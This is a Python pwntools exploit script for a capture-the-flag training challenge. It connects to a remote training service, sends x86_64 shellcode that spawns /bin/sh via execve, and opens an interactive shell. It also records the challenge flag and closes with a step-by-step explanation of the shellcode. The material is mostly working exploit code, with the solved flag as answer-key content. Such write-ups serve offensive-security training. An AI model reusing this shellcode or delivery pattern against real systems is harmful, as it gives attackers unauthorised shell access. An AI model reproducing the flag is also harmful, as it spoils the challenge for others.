from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']

""" r = process("./tiny")
gdb.attach(r,'''
        b puts
        c
        ''')
#gdb.attach(r)
input("wait") """

r = remote("bin.training.offdef.it", 4101)

context.arch = "amd64"

asm_code = """
push rdx
pop rax
add al, 0x10
push rax
pop rdi
xor eax, eax
mov al, 0x3b
xor edx, edx
xor esi, esi
syscall
.string "/bin/sh"
"""
r.recvuntil("> ")
r.sendline(asm(asm_code))

r.interactive()

# Flag = flag{F3llS_l1k3_sh3llc0d1NG_1n_4rm_THumb_but_is_not!}

""" 
This code snippet appears to be a minimalistic shellcode written in assembly language for a Linux system, targeting the x86_64 architecture. Shellcode is a small piece of code used as the payload in the exploitation of a software vulnerability. It is typically used to open a shell from which the attacker can control the compromised machine. Here's a breakdown of what each instruction does:

1. `push rdx`: This saves the current value of the `rdx` register on the stack. The `rdx` register often holds data such as a pointer or an index.

2. `pop rax`: This pops the top value from the stack into the `rax` register. Since `rdx` was just pushed, this effectively moves the value of `rdx` into `rax`.

3. `add al, 0x10`: This adds the hexadecimal value `0x10` (16 in decimal) to the lower 8 bits (`al`) of the `rax` register. This might be a form of simple encoding or used to adjust a pointer value.

4. `push rax`: Pushes the value of `rax` onto the stack. This is likely preparing for another register transfer.

5. `pop rdi`: Pops the top value from the stack into the `rdi` register. Similar to before, this moves the value from `rax` to `rdi`.

6. `xor eax, eax`: This clears the `eax` register (which is the lower 32 bits of `rax`) by XORing it with itself. This is a common way to set a register to zero.

7. `mov al, 0x3b`: Moves the hexadecimal value `0x3b` (59 in decimal) into the lower 8 bits of the `rax` register. In Linux, the value `0x3b` is the syscall number for `execve`, which executes a program.

8. `xor edx, edx`: Clears the `edx` register. Similar to the earlier XOR, this sets `edx` to zero.

9. `xor esi, esi`: Clears the `esi` register, setting it to zero. `esi` is the lower 32 bits of the `rsi` register.

10. `syscall`: This instruction triggers a system call. Given the previous setup, this is invoking the `execve` system call. The `rdi`, `rsi`, and `rdx` registers are typically used as the first three arguments to system calls. Here, `rdi` would be a pointer to the command to execute (`/bin/sh`), `rsi` and `rdx` being cleared means they are effectively null, indicating no arguments and no environment variables, respectively.

11. `.string "/bin/sh"`: This is not an instruction but a directive to include the string "/bin/sh" in the shellcode. This string is the path to the Bourne shell in Unix and Linux systems. This string is likely referenced by the `rdi` register as the command for the `execve` syscall.

Overall, this shellcode sets up and executes an `execve` system call to launch a shell (`/bin/sh`). The clever use of pushing and popping registers, along with the minimal use of instructions, indicates an attempt to keep the shellcode as short and efficient as possible, which is typical in exploit development.
 """